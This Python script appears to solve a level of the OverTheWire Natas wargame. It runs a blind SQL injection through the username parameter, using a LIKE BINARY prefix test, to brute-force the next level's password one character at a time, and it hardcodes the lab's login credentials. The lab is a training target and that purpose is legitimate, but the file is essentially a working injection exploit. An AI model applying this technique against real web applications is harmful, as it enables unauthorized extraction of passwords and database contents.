#!/usr/bin/python3

import requests
from string import ascii_letters, digits

USERNAME = "natas16"
BASE_URL = "http://natas15.natas.labs.overthewire.org"
EXPECTED_OUTPUT = "This user exists."

AUTHENTICATION = {'username': 'natas15',
                  'password': 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'}


def create_url_query(first_characters_in_password: str) -> str:
    """
    Creates an url query with username and password.
    """
    # username is natas16 and password starts with given characters (case sensitive)
    query = "/?username={}\" and password LIKE BINARY \"{}%".format(
        USERNAME, first_characters_in_password)
    return query


def valid_url(url: str, expected_output: str) -> bool:
    """
    Check if the given url returns the expected output.
    """
    session = requests.Session()
    session.auth = (AUTHENTICATION['username'], AUTHENTICATION['password'])
    response = session.get(url=url)
    data = response.text
    return expected_output in data


def run_brute_force() -> str:
    """
    Starts brute force and return result.
    """
    characters_in_password = []
    possible_characters = ascii_letters + digits

    for _ in range(0, 64):
        found_valid_letter = False

        # go through all ascii letters (a-z A-Z) and numbers (0-9)
        for c in possible_characters:
            query = create_url_query(''.join(characters_in_password) + c)
            if valid_url(BASE_URL + query, EXPECTED_OUTPUT):
                characters_in_password.append(c)
                found_valid_letter = True
                break

        # If there is no valid letter found break
        if not found_valid_letter:
            break

    return ''.join(characters_in_password)


def main():
    print("Starting brute force...")
    password = run_brute_force()
    print("Brute force result:", password)


if __name__ == "__main__":
    main()
